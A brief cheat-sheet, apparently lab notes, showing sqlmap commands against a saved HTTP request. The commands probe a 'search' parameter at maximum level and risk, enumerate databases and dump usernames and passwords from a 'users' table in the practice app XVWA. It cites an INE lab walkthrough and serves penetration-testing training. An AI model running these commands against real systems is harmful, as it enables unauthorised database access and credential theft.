# SQLMap

### Usage Example

```bash
sqlmap -r req.txt
sqlmap -r req.txt -p search --level 5 --risk 3 --dbs
sqlmap -r req.txt -p search --level 5 --risk 3 --current-db
sqlmap -r req.txt -p search --level 5 --risk 3 -D xvwa -T users -C username,password --dump
```



### Reference:

[SQL Injection with SQLMap](https://assets.ine.com/labs/ad-manuals/walkthrough-2129.pdf)
